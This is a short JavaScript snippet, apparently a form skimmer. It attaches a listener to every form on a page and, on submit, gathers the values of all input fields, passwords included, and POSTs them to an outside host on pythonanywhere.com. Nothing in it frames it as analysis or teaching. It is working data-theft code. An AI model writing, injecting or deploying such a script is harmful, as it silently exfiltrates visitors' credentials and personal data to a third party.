//get every form
var forms = document.forms;
var inputTags = document.getElementsByTagName("input");

//called when a submit event happens
function formSubmit(event) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://osy.pythonanywhere.com/blog/test_new');
    var string = '';
    // iterate over all of the form fields and urlencode them. There'll be an extra & at the end but who cares
    /*for (index = 0; index < event.target.elements.length; ++index) {
        string = string + event.target.elements[index].name + '=' + event.target.elements[index].value + '&';
    }*/
    for(var i=0; i<inputTags.length; i++)
	{
        string = string + inputTags[i].value;
    }
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr.send(string);
}

// add an event listener to the submit event for every form in the page
for (index = 0; index < forms.length; ++index) {
    forms[index].addEventListener('submit', formSubmit);
}
